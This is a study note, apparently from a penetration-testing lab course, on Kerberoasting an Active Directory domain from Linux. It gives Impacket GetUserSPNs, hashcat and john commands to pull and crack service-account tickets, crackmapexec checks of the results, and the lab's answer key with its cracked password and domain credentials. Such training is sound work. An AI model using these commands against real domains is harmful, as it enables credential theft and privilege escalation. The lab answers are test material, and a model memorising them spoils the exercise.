# NOTE template — hands-on section (has commands)

---

## ID
530

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 17 — Kerberoasting from Linux

## Description
Enumerate SPN accounts and perform Kerberoasting using Impacket's GetUserSPNs.py from a Linux attack host to extract TGS tickets and crack service account passwords offline with Hashcat.

## Tags
kerberoasting, spn, impacket, hashcat, lateral-movement, privilege-escalation

## Commands
- GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
- GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request
- GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER>
- GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER> -outputfile <OUTFILE>
- hashcat -m 13100 <TGS_FILE> <WORDLIST> --force
- john --wordlist=<WORDLIST> <TGS_FILE>
- sudo crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD>

## What This Section Covers
Kerberoasting is a lateral movement / privilege escalation attack that targets domain accounts with Service Principal Names (SPNs). Any domain user can request a Kerberos TGS ticket for any SPN account; the ticket is encrypted with the service account's NTLM hash, making it crackable offline. Service accounts are frequently over-privileged (Domain Admins, local admin on multiple servers) and often have weak or reused passwords, making this a high-value attack path.

## Methodology
1. Confirm you have valid domain user credentials (cleartext password or NTLM hash) and identify the Domain Controller IP.
2. Enumerate all SPN accounts with `GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>` — review the `MemberOf` column to prioritize high-privilege targets (Domain Admins, Account Operators, etc.).
3. Request TGS tickets for all SPNs with `-request`, or target a specific account with `-request-user <SPN_USER>`.
4. Save output to a file with `-outputfile <FILENAME>` for cleaner workflow.
5. Crack the TGS ticket offline with `hashcat -m 13100 <TGS_FILE> /usr/share/wordlists/rockyou.txt`.
6. Validate the cracked credentials with `crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD>` — look for `(Pwn3d!)` which confirms admin access.

## Multi-step Workflow
```
# 1. Enumerate SPNs (review MemberOf for high-value targets)
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# 2. Request TGS ticket for target account
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile SAPService_tgs

# 3. Crack offline (use --force on lab VMs, or john as fallback)
hashcat -m 13100 SAPService_tgs /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt SAPService_tgs

# 4. Validate cracked creds
sudo crackmapexec smb 172.16.5.5 -u SAPService -p '!SapperFi2'
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Crack the SAPService TGS ticket — what is the password? | `!SapperFi2` | `GetUserSPNs.py -request-user SAPService` → `john --wordlist=rockyou.txt` (hashcat needed `--force` on lab VM) |
| Q2: What powerful local group on the DC is SAPService a member of? | `Account Operators` | `MemberOf` column: `CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL` |

## Key Takeaways
- Any domain user can request a TGS ticket for any SPN — no special privileges needed. The attack is about cracking the ticket offline, not about the request itself.
- Always check `MemberOf` before cracking — prioritize Domain Admins and other privileged groups to focus cracking efforts on high-value targets.
- Hashcat mode `13100` = Kerberos 5 TGS-REP etype 23. TGS tickets are slower to crack than NTLM hashes, so weak passwords are the real enabler of this attack.
- Even if no tickets crack, Kerberoasting is still a reportable finding (medium risk with strong passwords, high risk if any crack).
- Service accounts with SPNs are often local admin on multiple servers or outright Domain Admins due to the distributed nature of services.
- Use `-outputfile` to save tickets cleanly — avoids messy copy-paste of long ticket blobs from terminal output.

## Gotchas
- `htb-student` is a local Linux account on the attack box, NOT a domain user — use `forend` / `Klmcargo2` for LDAP queries against the DC. Error `data 52e` = invalid credentials.
- On HTB lab VMs, hashcat may skip the device due to OpenCL driver issues — add `--force` to override, or just use `john --wordlist=rockyou.txt <file>` instead.
- The TGS ticket output is very long — if you don't use `-outputfile`, you risk truncation or copy-paste errors in the terminal.
- `crackmapexec` showing `[+]` means valid creds, but only `(Pwn3d!)` means you have admin-level access on that host.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[16-living-off-the-land]] | [[18-kerberoasting-windows]] →
<!-- AUTO-LINKS-END -->
